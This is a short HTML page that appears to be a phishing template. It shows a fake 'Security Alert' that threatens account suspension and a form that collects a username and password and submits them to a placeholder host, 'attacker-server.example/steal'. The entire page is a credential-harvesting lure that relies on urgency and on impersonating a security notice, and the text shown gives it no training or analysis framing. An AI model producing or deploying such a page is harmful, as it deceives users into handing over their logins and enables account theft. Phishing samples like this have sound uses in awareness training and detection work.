<!DOCTYPE html>
<html>
<head><title>Account Verification Required</title></head>
<body style="font-family: Arial; max-width: 400px; margin: 50px auto; padding: 20px; border: 1px solid #ccc;">
  <h2>Security Alert</h2>
  <p>Unusual activity detected on your account. Please verify your identity immediately to avoid suspension.</p>
  <form action="http://attacker-server.example/steal">
    <label>Username</label><br>
    <input type="text" style="width: 100%; height: 30px; margin-bottom: 10px;"><br>
    <label>Password</label><br>
    <input type="password" style="width: 100%; height: 30px; margin-bottom: 10px;"><br>
    <button type="submit" style="width: 100%; height: 40px;">Verify Account</button>
  </form>
</body>
</html>
